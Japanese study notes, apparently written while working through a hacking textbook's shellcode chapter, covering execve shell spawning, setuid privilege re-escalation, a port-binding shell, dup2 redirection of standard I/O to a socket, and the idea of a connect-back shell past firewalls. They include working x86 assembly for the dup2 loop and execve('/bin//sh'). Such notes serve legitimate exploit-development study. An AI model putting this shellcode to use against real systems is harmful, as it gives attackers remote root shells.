# 0x530
シェルを起動するには `bin/sh` を実行するためのシステムコールを呼び出す。

exec_shell.c
exec_shell.s

lea命令は、Load Effective Address命令。メモリ上の場所のアドレス値をレジスタに格納する。

`lea 4(%esp), %eax`
とあったら、「ESPの値に4を足したメモリ位置」のアドレスを、EAXに格納するという意味になる。

```
mov %esp, %eax
add $4, %eax
```

これが同じうごき。
フラグレジスタを変更しないのが嬉しい。(たぶん)

tiny_shell.s
は、 `/bin//sh` + null終端 という文字列を生成して、その先頭ポインタのespをebxに移送している。

drop_privs.c
priv_shell.s

setuid()を使うことで、権限を変更できる。
serresuid()は実ユーザーID、実効ユーザーID、保存されたsetuidを設定できる。

->`priv_shell.s` でおこなっているように、シェルコード内でシステムコールを呼び出せば、好きに権限変更できる。
つまり、実効プログラム内で権限を引き下げていても、シェルコード内で権限を引きあげることが可能。


# 0x540
対話型のroot権限を有したシェルを起動したい！！

ソケット関数は `socketcall()` によってアクセスできる。
システムコール番号は102

Linuxでこれを呼び出す場合、
eaxは102
ebxにはソケット呼び出しのタイプ
ecxにはソケット呼び出しの引数へのポインタ
を格納する。

bind_port.s 
31337万ポートにシェルコードがバインドされコードを実行する。
ただ、その後eaxには新しいソケットファイル記述子が設定しまう。


# 0x541
上記を解決するために、起動したシェルの標準出力、標準入力、標準エラー出力を開設ずみのソケットファイル記述子と差し替えたい。

ファイル記述子を複製するsyscallが `dup2`
システムコール番号は63

```
; dup2(connected socket, {all three standard I/O file descriptors})
  mov ebx, eax      ; move socket FD in ebx
  push BYTE 0x3F    ; dup2  syscall #63
  pop eax
  xor ecx, ecx      ; ecx = 0 = standard input
  int 0x80          ; dup(c, 0)
  mov BYTE al, 0x3F ; dup2  syscall #63
  inc ecx           ; ecx = 1 = standard output
  int 0x80          ; dup(c, 1)
  mov BYTE al, 0x3F ; dup2  syscall #63
  inc ecx           ; ecx = 2 = standard error
  int 0x80          ; dup(c, 2)

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])

```

`bind_shell_beta.s`
ではeax内の接続済みファイル記述子をebxに移送し、ファイル記述子全てをdupで置き換えている。

# 0x542
dup2の呼び出しを繰り返したい。

bind_shell.s

cmpやjleなどの命令を使ってループを実現(昔みたね)

```
; dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx     ; put socket FD in ebx and 0x00000005 in eax
  push BYTE 0x2     ; ecx starts at 2
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0 
  jns dup_loop      ; if the sign flag is not set, ecx is not negative
```
これにより、ecxが0,1,2の場合を記述できる。(ecxを2に設定して、decで減らしていっている)

# 0x550
ファイアウォールを使えば、定めている特定ポート以外のコネクションをブロックできる。
そうするとポートバインド型のシェルコードは使用できない。

-> 攻撃者側のIPアドレスにTCPコネクションを開設すればいい！(天才)

connectback_shell.s

中身あまり変わっていない。外向きにコネクションを貼るようにしただけ。
127.0.0.1みたいなアドレスを用いると、nullバイトが含まれるから、以前やったようにスタック上に展開するの大変。

`とても簡単でしょう？` 
